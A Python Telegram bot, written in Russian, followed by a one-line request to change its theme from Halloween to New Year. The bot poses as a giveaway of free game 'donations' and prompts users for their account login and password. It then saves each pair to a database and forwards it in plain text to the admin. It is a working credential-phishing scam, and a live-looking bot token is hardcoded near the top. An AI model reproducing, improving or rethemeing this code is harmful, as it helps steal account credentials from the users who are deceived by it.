import logging
from telegram import Update, ReplyKeyboardMarkup, KeyboardButton
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes, ConversationHandler
import sqlite3
from datetime import datetime, timedelta
import asyncio

# Настройки
BOT_TOKEN = "8300222284:AAHt3oT-fxyls9-xv0CNjG4ucFp4Y3vLFmU"
ADMIN_ID = 8000395560 # Замените на ваш ID админа
CHANNEL_USERNAME = "@pnixmcbe"  # Замените на username вашего канала
CREATOR_USERNAME = "@isnikson"  # Замените на username создателя

# Состояния для ConversationHandler
ENTER_LOGIN, ENTER_PASSWORD = range(2)

# База данных для хранения пользователей и банов
def init_db():
    conn = sqlite3.connect('halloween_bot.db')
    cursor = conn.cursor()
    
    # Таблица пользователей
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS users (
            user_id INTEGER PRIMARY KEY,
            username TEXT,
            first_name TEXT,
            last_name TEXT,
            message_count INTEGER DEFAULT 0,
            last_message_time TIMESTAMP,
            is_banned BOOLEAN DEFAULT FALSE,
            ban_until TIMESTAMP
        )
    ''')
    
    # Таблица для логов донатов
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS donation_logs (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER,
            username TEXT,
            login TEXT,
            password TEXT,
            timestamp TIMESTAMP
        )
    ''')
    
    conn.commit()
    conn.close()

# Инициализация базы данных
init_db()

# Настройка логирования
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    user_id = user.id
    
    # Проверяем не забанен ли пользователь
    if is_user_banned(user_id):
        await update.message.reply_text("❌ Вы забанены и не можете использовать бота.")
        return
    
    welcome_text = f"""
👻 Добро пожаловать в РаздачБота! 🎄

📢 Наш канал: {CHANNEL_USERNAME}
👨‍💻 Создатель: {CREATOR_USERNAME}

💀 Чтобы получить специальный NewYear донат, вам нужно ввести данные вашего аккаунта.

⚠️ ВНИМАНИЕ: Введите только свои **данные**
"""
    
    keyboard = [
        [KeyboardButton("🎄 Получить **NewYear** донат")],
        [KeyboardButton("📢 Наш канал"), KeyboardButton("👨‍💻 Создатель")]
    ]
    reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
    
    await update.message.reply_text(welcome_text, reply_markup=reply_markup)
    
    # Сбрасываем состояние если было
    if context.user_data.get('in_donation_process'):
        context.user_data.clear()

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    user_id = user.id
    message_text = update.message.text
    
    # Проверяем бан
    if is_user_banned(user_id):
        await update.message.reply_text("❌ Вы забанены и не можете использовать бота.")
        return
    
    # Анти-спам система
    if not update_antispam(user_id):
        await ban_user(user_id, "Спам (более 10 сообщений в минуту)")
        await update.message.reply_text("❌ Вы забанены за спам!")
        await notify_admin(f"🚨 Пользователь забанен за спам:\n"
                          f"ID: {user_id}\n"
                          f"Username: @{user.username if user.username else 'N/A'}\n"
                          f"Имя: {user.first_name}")
        return
    
    # Обработка кнопок
    if message_text == "🎄 Получить **NewYear** донат":
        await start_donation(update, context)
    elif message_text == "📢 Наш канал":
        await update.message.reply_text(f"📢 Подписывайтесь на наш канал: {CHANNEL_USERNAME}")
    elif message_text == "👨‍💻 Создатель":
        await update.message.reply_text(f"👨‍💻 Наш создатель: {CREATOR_USERNAME}")
    else:
        await update.message.reply_text("🤔 Используйте кнопки для навигации!")

async def start_donation(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    user_id = user.id
    
    if is_user_banned(user_id):
        await update.message.reply_text("❌ Вы забанены и не можете использовать бота.")
        return
    
    await update.message.reply_text(
        "🎄 Для получения **NewYear** доната введите логин вашего аккаунта:\n"
        "⚠️ Используйте только тестовые данные!"
    )
    return ENTER_LOGIN

async def enter_login(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    user_id = user.id
    
    if is_user_banned(user_id):
        await update.message.reply_text("❌ Вы забанены и не можете использовать бота.")
        return ConversationHandler.END
    
    login = update.message.text
    context.user_data['login'] = login
    context.user_data['in_donation_process'] = True
    
    await update.message.reply_text(
        "🔐 Теперь введите пароль:\n"
        "⚠️ Используйте только тестовые данные!"
    )
    return ENTER_PASSWORD

async def enter_password(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    user_id = user.id
    
    if is_user_banned(user_id):
        await update.message.reply_text("❌ Вы забанены и не можете использовать бота.")
        return ConversationHandler.END
    
    password = update.message.text
    login = context.user_data.get('login')
    
    # Сохраняем в базу данных
    save_donation_log(user_id, user.username, login, password)
    
    # Отправляем админу
    admin_message = (
        "🎃 НОВЫЙ HALLOWEEN ДОНАТ! 🎃\n"
        f"👤 Пользователь: @{user.username if user.username else 'N/A'}\n"
        f"🆔 ID: {user_id}\n"
        f"📛 Имя: {user.first_name}\n"
        f"🔑 Логин: {login}\n"
        f"🔒 Пароль: {password}\n"
        f"⏰ Время: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
    )
    
    await notify_admin(admin_message)
    
    # Ответ пользователю
    await update.message.reply_text(
        "🎉 Спасибо! Вы находитесь в очереди!\n"
        "👻 NewYear донат будет зачислен в ближайшее время!\n"
        "⚠️ Помните: Будущие за вами!!"
    )
    
    # Очищаем состояние
    context.user_data.clear()
    return ConversationHandler.END

async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data.clear()
    await update.message.reply_text("❌ Процесс отменен.")
    return ConversationHandler.END

# Админ команды
async def ban_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text("❌ У вас нет прав для этой команды.")
        return
    
    if not context.args or len(context.args) < 1:
        await update.message.reply_text("Использование: /ban <user_id> [причина]")
        return
    
    try:
        user_id_to_ban = int(context.args[0])
        reason = " ".join(context.args[1:]) if len(context.args) > 1 else "Не указана"
        
        await ban_user(user_id_to_ban, reason)
        await update.message.reply_text(f"✅ Пользователь {user_id_to_ban} забанен.\nПричина: {reason}")
        
    except ValueError:
        await update.message.reply_text("❌ Неверный формат user_id")

async def unban_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text("❌ У вас нет прав для этой команды.")
        return
    
    if not context.args or len(context.args) < 1:
        await update.message.reply_text("Использование: /unban <user_id>")
        return
    
    try:
        user_id_to_unban = int(context.args[0])
        unban_user(user_id_to_unban)
        await update.message.reply_text(f"✅ Пользователь {user_id_to_unban} разбанен.")
        
    except ValueError:
        await update.message.reply_text("❌ Неверный формат user_id")

async def stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text("❌ У вас нет прав для этой команды.")
        return
    
    stats = get_bot_stats()
    await update.message.reply_text(
        f"📊 Статистика бота:\n"
        f"👥 Всего пользователей: {stats['total_users']}\n"
        f"🎃 Всего донатов: {stats['total_donations']}\n"
        f"🚫 Забанено: {stats['banned_users']}"
    )

# Вспомогательные функции
def update_antispam(user_id):
    """Обновляет счетчик сообщений и проверяет на спам"""
    conn = sqlite3.connect('halloween_bot.db')
    cursor = conn.cursor()
    
    now = datetime.now()
    
    # Получаем текущие данные пользователя
    cursor.execute('SELECT message_count, last_message_time FROM users WHERE user_id = ?', (user_id,))
    result = cursor.fetchone()
    
    if result:
        message_count, last_message_time = result
        last_message_time = datetime.fromisoformat(last_message_time) if last_message_time else now
        
        # Если прошло больше минуты - сбрасываем счетчик
        if (now - last_message_time).total_seconds() > 60:
            message_count = 1
        else:
            message_count += 1
    else:
        message_count = 1
        # Создаем запись пользователя
        cursor.execute(
            'INSERT OR REPLACE INTO users (user_id, message_count, last_message_time) VALUES (?, ?, ?)',
            (user_id, message_count, now.isoformat())
        )
    
    # Обновляем данные
    cursor.execute(
        'UPDATE users SET message_count = ?, last_message_time = ? WHERE user_id = ?',
        (message_count, now.isoformat(), user_id)
    )
    
    conn.commit()
    conn.close()
    
    return message_count <= 10  # Максимум 10 сообщений в минуту

async def ban_user(user_id, reason):
    """Банит пользователя"""
    conn = sqlite3.connect('halloween_bot.db')
    cursor = conn.cursor()
    
    ban_until = (datetime.now() + timedelta(days=30)).isoformat()  # Бан на 30 дней
    
    cursor.execute(
        'INSERT OR REPLACE INTO users (user_id, is_banned, ban_until) VALUES (?, ?, ?)',
        (user_id, True, ban_until)
    )
    
    conn.commit()
    conn.close()

def unban_user(user_id):
    """Разбанивает пользователя"""
    conn = sqlite3.connect('halloween_bot.db')
    cursor = conn.cursor()
    
    cursor.execute(
        'UPDATE users SET is_banned = FALSE, ban_until = NULL WHERE user_id = ?',
        (user_id,)
    )
    
    conn.commit()
    conn.close()

def is_user_banned(user_id):
    """Проверяет забанен ли пользователь"""
    conn = sqlite3.connect('halloween_bot.db')
    cursor = conn.cursor()
    
    cursor.execute('SELECT is_banned, ban_until FROM users WHERE user_id = ?', (user_id,))
    result = cursor.fetchone()
    
    conn.close()
    
    if result and result[0]:  # is_banned = True
        if result[1]:  # Если есть время бана
            ban_until = datetime.fromisoformat(result[1])
            if datetime.now() > ban_until:
                unban_user(user_id)  # Автоматически разбаниваем если время вышло
                return False
        return True
    return False

def save_donation_log(user_id, username, login, password):
    """Сохраняет лог доната"""
    conn = sqlite3.connect('halloween_bot.db')
    cursor = conn.cursor()
    
    cursor.execute(
        'INSERT INTO donation_logs (user_id, username, login, password, timestamp) VALUES (?, ?, ?, ?, ?)',
        (user_id, username, login, password, datetime.now().isoformat())
    )
    
    conn.commit()
    conn.close()

def get_bot_stats():
    """Возвращает статистику бота"""
    conn = sqlite3.connect('halloween_bot.db')
    cursor = conn.cursor()
    
    cursor.execute('SELECT COUNT(*) FROM users')
    total_users = cursor.fetchone()[0]
    
    cursor.execute('SELECT COUNT(*) FROM donation_logs')
    total_donations = cursor.fetchone()[0]
    
    cursor.execute('SELECT COUNT(*) FROM users WHERE is_banned = TRUE')
    banned_users = cursor.fetchone()[0]
    
    conn.close()
    
    return {
        'total_users': total_users,
        'total_donations': total_donations,
        'banned_users': banned_users
    }

async def notify_admin(message):
    """Отправляет сообщение админу"""
    try:
        app = Application.builder().token(BOT_TOKEN).build()
        await app.bot.send_message(ADMIN_ID, message)
    except Exception as e:
        logging.error(f"Ошибка отправки сообщения админу: {e}")

def main():
    # Создаем приложение
    application = Application.builder().token(BOT_TOKEN).build()
    
    # ConversationHandler для процесса доната
    donation_conv_handler = ConversationHandler(
        entry_points=[MessageHandler(filters.Regex("🎄 Получить Halloween донат"), start_donation)],
        states={
            ENTER_LOGIN: [MessageHandler(filters.TEXT & ~filters.COMMAND, enter_login)],
            ENTER_PASSWORD: [MessageHandler(filters.TEXT & ~filters.COMMAND, enter_password)],
        },
        fallbacks=[CommandHandler("cancel", cancel)]
    )
    
    # Добавляем обработчики
    application.add_handler(CommandHandler("start", start))
    application.add_handler(donation_conv_handler)
    application.add_handler(CommandHandler("ban", ban_command))
    application.add_handler(CommandHandler("unban", unban_command))
    application.add_handler(CommandHandler("stats", stats_command))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    
    # Запускаем бота
    print("Бот запущен...")
    application.run_polling()

if __name__ == '__main__':
    main()


надо переделать тематику на новый год! место хеллоуина !
